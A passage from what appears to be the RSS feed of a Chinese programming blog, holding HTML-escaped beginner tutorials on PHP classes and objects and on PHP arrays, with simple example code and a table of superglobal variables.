void echo(string arg1 [,string &amp;hellip;])&lt;/p></description></item><item><title>PHP 之面向对象</title><link>https://wyb0.cn/posts/2016/php-object-oriented/</link><pubDate>Fri, 20 May 2016 16:07:55 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-object-oriented/</guid><description>&lt;h3 id="0x00-面向对象">0x00 面向对象&lt;/h3>
&lt;ol>
&lt;li>面向对象概念
&lt;ul>
&lt;li>面向对象是达到了软件工程的三个目标：重用性、灵活性和扩展性，使其编程的代码更加简洁、更易于维护、并且具有更强的可重用性。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>类和对象的关系
&lt;ul>
&lt;li>在面向对象的编程语言中，类是一个对立的程序单位，而对象的抽象就是类。类描述了一组有相同特性(属性)和相同行为(方法)的对象。开发时要先抽象类再用该类去创建对象。而我们的程序中直接使用的是对象而不是类。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>什么是类
&lt;ul>
&lt;li>在面向对象的编程语言中，类是一个对立的程序单位，是具有相同属性和服务的一组对象的集合。它为属于该类的所有对象提供了同意的抽象描述，其内部包括成员属性和服务的方法两个部分。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>什么是对象
&lt;ul>
&lt;li>在客观世界里，所有的事物都是由对象和对象之间的联系组成的。对象是系统中用来描述客观事物的一个实体，它是构成系统的一个基本单位，一个对象由一组属性和有权对这些属性进行操作的一组服务的封装体。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="0x01-类的声明">0x01 类的声明&lt;/h3>
&lt;ol>
&lt;li>类名和变量名还有函数名的命名规则类似，都遵循PHP中定义名称的命名规则。&lt;/li>
&lt;li>若类名由多个单词组成，习惯上每个单词的首字母要大写&lt;/li>
&lt;li>类中成员可分为属性和方法&lt;/li>
&lt;li>属性为静态描述，方法为动态描述&lt;/li>
&lt;li>在类中声明成员属性时，变量前面一定要有关键字，如：public、private、static等&lt;/li>
&lt;li>若不需要有特定意义的修饰，则使用var关键字&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">格式：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#a6e22e">一些修饰类的关键字&lt;/span>] &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">类名&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">类中成员&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">Class&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">成员属性：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">姓名、性别、年龄、身高、体重、电话、住址等&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">成员方法：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">说话、学习、走路、吃饭、开车、使用手机等&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">例子：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> $name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> $age;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> $sex;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">say&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;人在说话&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;人在走路&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-实例化对象">0x02 实例化对象&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">格式：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$变量名 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">类名称&lt;/span>([&lt;span style="color:#a6e22e">参数列表&lt;/span>]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$变量名 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">类名称&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">例子：&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Phone&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// ...
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $person1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $person2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $person3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $phone1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Phone&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $phton2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Phone&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $phton3 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Phone&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x03-对象中成员的访问">0x03 对象中成员的访问&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#e6db74">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> *声明一个人类Person，其中包含三个成员属性和两个成员方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	&lt;span style="color:#66d9ef">var&lt;/span> $name;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> $age;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">var&lt;/span> $sex;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">say&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;我的名字：&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;,性别：&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">sex&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;，年龄：&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">age&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;。&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	&lt;span style="color:#66d9ef">echo&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;在走路&amp;lt;br /&amp;gt;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $xiaoming &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $wyb &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Person&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $xiaoming&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;小明&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $xiaoming&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">sex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;男&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $xiaoming&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $wyb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;wyb&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $wyb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">sex&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;男&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $wyb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $xiaoming&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">say&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $wyb&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">run&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x04-构造方法和析构方法">0x04 构造方法和析构方法&lt;/h3>
&lt;ul>
&lt;li>构造方法和析构方法是对象中两个特殊的方法&lt;/li>
&lt;li>构造方法是对象创建完成后第一个被对象自动调用的方法&lt;/li>
&lt;li>析构方法是对象在销毁之前最后一个被对象自动调用的方法&lt;/li>
&lt;li>通常用构造方法完成一些对象的初始化工作，用析构方法完成一些对象在销毁前的清理工作&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">_&lt;/span> &lt;span style="color:#a6e22e">_construct&lt;/span>([&lt;span style="color:#a6e22e">参数列表&lt;/span>]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">//方法体，通常用来对成员属性进行初始化赋值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">_&lt;/span> &lt;span style="color:#a6e22e">_destruct&lt;/span>([&lt;span style="color:#a6e22e">参数列表&lt;/span>]) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#75715e">//方法体，通常用来完成一些在对象销毁前的清理工作
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>PHP 之数组</title><link>https://wyb0.cn/posts/2016/php-array/</link><pubDate>Wed, 18 May 2016 11:09:46 +0000</pubDate><guid>https://wyb0.cn/posts/2016/php-array/</guid><description>&lt;h3 id="0x00-分类">0x00 分类&lt;/h3>
&lt;ol>
&lt;li>索引数组
索引值从0开始，依次递增&lt;/li>
&lt;li>关联数组
以字符串为索引，键和值对是无序组合，每个键都是唯一的&lt;/li>
&lt;/ol>
&lt;h3 id="0x01-数组的定义">0x01 数组的定义&lt;/h3>
&lt;p>两种方法：&lt;/p>
&lt;ol>
&lt;li>直接为数组元素赋值即可声明数组&lt;/li>
&lt;li>使用array()函数声明数组&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 1.直接为数组元素赋值即可声明数组
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $contact_index[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_index[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;高某&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_index[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;A公司&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_index[&lt;span style="color:#ae81ff">3&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;北京市&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_index[] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;gao@a.com&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_dump&lt;/span>($contact_index);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_key[&lt;span style="color:#e6db74">&amp;#34;ID&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;2&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_key[&lt;span style="color:#e6db74">&amp;#34;姓名&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;峰某&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_key[&lt;span style="color:#e6db74">&amp;#34;公司&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;B公司&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $contact_key[&lt;span style="color:#e6db74">&amp;#34;邮箱&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;feng@b.com&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_dump&lt;/span>($contact_key);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 2.使用array()函数声明数组
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $contact_key_array &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">array&lt;/span>(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ID&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;姓名&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;峰某&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;公司&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;B公司&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;邮箱&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;feng@b.com&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> );
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">var_dump&lt;/span>($contact_key_array);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-数组的遍历">0x02 数组的遍历&lt;/h3>
&lt;ol>
&lt;li>for语句遍历数组&lt;/li>
&lt;li>foreach语句遍历数组&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// for语句遍历索引数组
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $cars&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Volvo&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;BMW&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;SAAB&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $arrlength&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#a6e22e">count&lt;/span>($cars);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span>($x&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>; $x &lt;span style="color:#f92672">&amp;lt;&lt;/span> $arrlength; $x&lt;span style="color:#f92672">++&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> $cars[$x];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// foreach语句遍历关联数组
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> $age&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">array&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Bill&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#e6db74">&amp;#34;35&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Steve&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#e6db74">&amp;#34;37&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;Peter&amp;#34;&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#e6db74">&amp;#34;43&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">foreach&lt;/span>($age &lt;span style="color:#66d9ef">as&lt;/span> $x &lt;span style="color:#f92672">=&amp;gt;&lt;/span> $x_value) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Key=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $x &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;, Value=&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> $x_value;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x03-预定义数组">0x03 预定义数组&lt;/h3>
&lt;ol>
&lt;li>它就是一个特殊数组，操作方式没有区别&lt;/li>
&lt;li>不用声明它们，每个PHP脚本中默认存在&lt;/li>
&lt;li>它们在全局范围内自动生效
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>预定义数组&lt;/th>
 &lt;th style="text-align: left">说明&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>$_SERVER&lt;/td>
 &lt;td style="text-align: left">变量由Web服务器设定或者直接与当前脚本的执行环境相关联&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_ENV&lt;/td>
 &lt;td style="text-align: left">执行环境提交至脚本的变量&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_GET&lt;/td>
 &lt;td style="text-align: left">经由URL请求提交至脚本的变量&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_POST&lt;/td>
 &lt;td style="text-align: left">经由HTTP POST方法提交至脚本的变量&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_REQUEST&lt;/td>
 &lt;td style="text-align: left">经由GET，POST，COOKIE机制提交至脚本的变量，该数组不值得信任&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_FILES&lt;/td>
 &lt;td style="text-align: left">经由HTTP POST文件上传而提交至脚本的变量&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_COOKIE&lt;/td>
 &lt;td style="text-align: left">经由HTTP Cookies方法提交至脚本的变量&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>$_SESSION&lt;/td>
 &lt;td style="text-align: left">当前注册给脚本会话的变量&lt;/td>
